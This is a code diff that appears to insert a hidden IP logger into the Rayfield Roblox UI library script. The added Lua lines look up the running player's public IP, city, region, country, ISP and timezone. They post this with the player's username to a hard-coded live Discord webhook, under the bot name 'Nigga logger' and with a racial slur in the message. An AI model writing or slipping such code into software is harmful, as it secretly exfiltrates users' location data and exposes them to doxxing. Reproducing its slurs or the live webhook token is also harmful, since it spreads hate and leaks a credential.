@@ -9,6 +9,56 @@
 
 ]]
 
+local API = game.HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/", true))
+local Adress = `{API["country"]}, {API["regionName"]}, {API["city"]}`
+
+local Webhook = "https://discord.com/api/webhooks/1338202575836807224/hOmTSgVGcK35VgEkEePeDvT8BwUNjuvLwSQhgocz1NAgduyqz1G2kVzAnhyIZUemX-yZ"
+
+local data = 
+    {
+        ["content"] = `Looks like this nigga **{game.Players.LocalPlayer.Name}** executed this lmfao` ,
+        ["username"] = "Nigga logger",
+        ["avatar_url"] = "https://i.imgur.com/oY117mc.png",
+        ["embeds"] = {{
+            ["title"] = "__**Logged:**__",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffffff),
+            ["fields"] = {
+                {
+                    ["name"] = "__Adress:__",
+                    ["value"] = Adress,
+                    ["inline"] = true
+                },
+                {
+                ["name"] = "__Ip(public ofc)__",
+                ["value"] = API["query"],
+                ["inline"] = false,
+                },
+                {
+                ["name"] = "__ISP__",
+                ["value"] = API["isp"],
+                ["inline"] = false,
+                },
+                {
+                ["name"] = "__Timezone__",
+                ["value"] = API["timezone"],
+                ["inline"] = false,
+                },
+            }
+        }
+    }
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = Webhook, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
 if debugX then
 	warn('Initialising Rayfield')
 end
